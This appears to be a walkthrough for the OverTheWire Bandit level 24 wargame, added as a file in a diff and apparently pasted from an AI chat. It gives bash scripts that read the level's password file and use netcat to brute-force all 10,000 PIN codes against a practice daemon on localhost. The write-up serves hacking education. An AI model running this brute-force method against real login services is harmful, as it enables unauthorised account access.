@@ -1,0 +1,108 @@
+OverTheWire Bandit: Level 24 → Level 25
+This level involves a brute force attack against a daemon listening on a port. You need to submit the correct 4-digit PIN code along with the bandit24 password.
+Initial Reconnaissance
+First, let's understand what we're dealing with:
+bashnc localhost 30002
+You'll see a message asking for the password for bandit24 followed by a 4-digit PIN code, separated by a space.
+Understanding the Challenge
+
+A daemon is running on port 30002
+You need to send: <bandit24_password> <4-digit-PIN>
+The PIN is somewhere between 0000 and 9999
+You need to brute force all 10,000 combinations
+
+Solution Strategy
+Create a script that generates all possible combinations and tests them against the daemon.
+Step-by-Step Solution
+
+Create a working directory:
+
+bashmkdir -p /tmp/mybandit24
+cd /tmp/mybandit24
+
+Create a script to generate all PIN combinations:
+
+bashcat > generate_pins.sh << 'EOF'
+#!/bin/bash
+
+PASSWORD=$(cat /etc/bandit_pass/bandit24)
+OUTPUT_FILE="/tmp/mybandit24/pins.txt"
+
+# Generate all combinations from 0000 to 9999
+for i in {0000..9999}
+do
+    echo "$PASSWORD $i"
+done > $OUTPUT_FILE
+
+echo "Generated $(wc -l < $OUTPUT_FILE) combinations"
+EOF
+
+Make it executable and run:
+
+bashchmod +x generate_pins.sh
+./generate_pins.sh
+
+Test all combinations against the daemon:
+
+bashcat pins.txt | nc localhost 30002 > result.txt
+
+Filter out the wrong attempts to find the password:
+
+bash# Look for the successful attempt
+grep -v "Wrong" result.txt | grep -v "Please" | grep -v "^$"
+Or more simply:
+bashcat result.txt | sort -u | grep -v "Wrong"
+Alternative One-Liner Solution
+If you want a more compact approach:
+bashcd /tmp/mybandit24
+for i in {0000..9999}; do echo "$(cat /etc/bandit_pass/bandit24) $i"; done | nc localhost 30002 | grep -v "Wrong"
+Optimized Script
+Here's a cleaner version:
+bash#!/bin/bash
+
+mkdir -p /tmp/mybandit24_bruteforce
+cd /tmp/mybandit24_bruteforce
+
+PASSWORD=$(cat /etc/bandit_pass/bandit24)
+
+echo "Generating PIN combinations..."
+for i in {0000..9999}; do
+    echo "$PASSWORD $i"
+done > attempts.txt
+
+echo "Brute forcing... this may take a minute"
+cat attempts.txt | nc localhost 30002 > output.txt
+
+echo "Results:"
+grep -E "^[^W]" output.txt | grep -v "Please" | tail -n 5
+Key Concepts
+
+Brute Force Attack: Systematically trying all possible combinations
+Network Communication: Using netcat (nc) to communicate with network services
+Bash Loops: Using brace expansion {0000..9999} for iteration
+Output Filtering: Using grep to find the successful attempt
+
+Performance Tips
+
+The script may take 30-60 seconds to complete
+Generating the file first is faster than piping directly
+You can monitor progress with tail -f result.txt in another terminal
+
+Important Notes
+
+Make sure to use your actual bandit24 password (from level 23)
+The PIN must be exactly 4 digits (with leading zeros if needed)
+There are exactly 10,000 possible combinations (0000-9999)
+The daemon will close connection after sending all combinations
+
+Cleanup
+bashrm -rf /tmp/mybandit24*
+What You'll Learn
+
+Brute force attack techniques
+Working with network daemons
+Bash scripting for automation
+Pattern matching with grep
+Handling large-scale automated requests
+
+Good luck finding that PIN! 🔐RetryClaude does not have the ability to run the code it generates yet.Claude can make mistakes. Please double-check responses.
